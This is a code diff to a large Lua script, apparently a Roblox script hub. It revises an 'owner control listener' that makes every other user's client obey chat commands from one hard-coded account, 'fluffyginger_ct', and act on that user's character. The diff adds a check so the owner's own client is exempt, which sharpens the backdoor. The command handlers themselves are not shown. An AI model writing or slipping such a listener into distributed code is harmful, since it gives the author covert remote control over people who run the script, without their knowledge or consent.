@@ -29933,14 +29933,18 @@ end -- AsterFinalize
 
 -- // OWNER CONTROL LISTENER // --
 do
-    local OWNER = "fluffyginger_ct" -- replace with your main account name
+    local OWNER = "fluffyginger_ct"
+    local lp = game:GetService("Players").LocalPlayer
+
+    -- skip if this is the owner's own client
+    if lp.Name == OWNER then return end
 
     local function listenToOwner(p)
         if p.Name ~= OWNER then return end
         p.Chatted:Connect(function(msg)
             local args = msg:lower():split(" ")
             local cmd = args[1]
-            local char = plr.Character
+            local char = lp.Character
             local hrp = char and char:FindFirstChild("HumanoidRootPart")
             local hum = char and char:FindFirstChildOfClass("Humanoid")
 
@@ -29964,8 +29968,8 @@ do
         end)
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do
+    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
         listenToOwner(p)
     end
-    Players.PlayerAdded:Connect(listenToOwner)
+    game:GetService("Players").PlayerAdded:Connect(listenToOwner)
 end
